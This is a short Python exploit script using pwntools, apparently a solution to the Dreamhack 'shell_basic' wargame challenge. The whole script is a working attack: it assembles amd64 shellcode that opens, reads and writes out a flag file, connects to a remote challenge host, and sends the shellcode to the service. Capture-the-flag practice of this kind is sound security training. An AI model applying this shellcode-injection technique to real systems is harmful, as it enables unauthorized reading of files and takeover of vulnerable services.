from pwn import *
context.arch = "amd64"

flag_path = "/home/shell_basic/flag_name_is_loooooong"
sc  = shellcraft.open(flag_path)
sc += shellcraft.read("rax", "rsp", 0x100)
sc += shellcraft.write(1, "rsp", 0x100)

p = remote("host3.dreamhack.games", 10945)  #포트
p.sendafter(b"shellcode: ", asm(sc))
print(p.recvall(timeout=3).decode())